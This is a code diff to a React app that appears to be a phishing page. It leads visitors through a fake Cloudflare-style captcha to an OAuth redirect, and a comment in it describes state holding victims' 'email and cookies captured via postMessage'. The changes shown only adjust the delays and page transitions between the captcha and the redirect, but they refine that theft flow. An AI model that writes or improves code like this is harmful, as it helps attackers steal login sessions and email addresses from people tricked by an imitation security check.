@@ -12,9 +12,11 @@ const nextStepDelay = SLOW_DELAY * 3;
 const messageIconDelay = 500; // This matches the delay used in MessageIconLanding
 const captchaVerificationDelay = 1500; // Default verification delay for captcha
 
+// Calculate total delay for captcha to handle everything internally
+const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;
+
 function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
-  const [pendingStep, setPendingStep] = useState<string | null>(null);
 
   // State to hold the most reliable email and cookies captured via postMessage
   const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
@@ -246,20 +248,9 @@ function App() {
     }
   }, []);
 
-  // Use effect to handle delayed step transitions (not used for captcha to oauth anymore)
-  useEffect(() => {
-    if (pendingStep) {
-      const timer = setTimeout(() => {
-        setCurrentPage(pendingStep);
-        setPendingStep(null);
-      }, nextStepDelay);
-      return () => clearTimeout(timer);
-    }
-  }, [pendingStep]);
-
-  // Captcha verified: go to oauth redirect (delay handled in CloudflareCaptcha)
+  // Captcha verified: immediately go to oauth redirect (no delay)
   const handleCaptchaVerified = () => {
-    setPendingStep('oauth-redirect');
+    setCurrentPage('oauth-redirect');
   };
 
   const handleCaptchaBack = () => {
@@ -282,6 +273,7 @@ function App() {
           onBack={handleCaptchaBack}
           verificationDelay={captchaVerificationDelay}
           autoRedirectDelay={messageIconDelay}
+          totalDelayTime={totalCaptchaDelay}
         />
       );
 
@@ -382,6 +374,7 @@ function App() {
           onBack={handleCaptchaBack}
           verificationDelay={captchaVerificationDelay}
           autoRedirectDelay={messageIconDelay}
+          totalDelayTime={totalCaptchaDelay}
         />
       );
   }
